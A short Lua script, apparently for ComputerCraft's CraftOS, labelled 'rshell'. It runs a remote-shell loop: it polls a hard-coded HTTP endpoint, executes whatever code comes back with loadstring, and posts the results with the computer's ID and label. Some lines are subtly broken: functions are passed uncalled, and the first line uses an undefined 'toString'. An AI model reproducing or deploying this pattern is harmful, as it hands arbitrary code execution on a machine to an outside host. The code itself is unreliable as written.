api_endpoint = "http://kek:8000/result"

print("rshell v0.0.4 starting up...")
result = "BEGIN\n" .. tostring(os.getComputerID) .. "\n" .. toString(os.getComputerLabel)
repeat
  print("Getting a command...")
  a = http.post(api_endpoint, result)
  if a then
    s = loadstring(a.readAll())
    status, result = pcall(s)
    if not status then
      statusstring = "ERROR\n"
    else
      statusstring = "SUCCESS\n"
    end
    result = statusstring .. tostring(os.getComputerID) .. "\n" .. tostring(os.getComputerLabel) .. "\n" .. tostring(result)
  end
until not a
print("Exiting to CraftOS.")
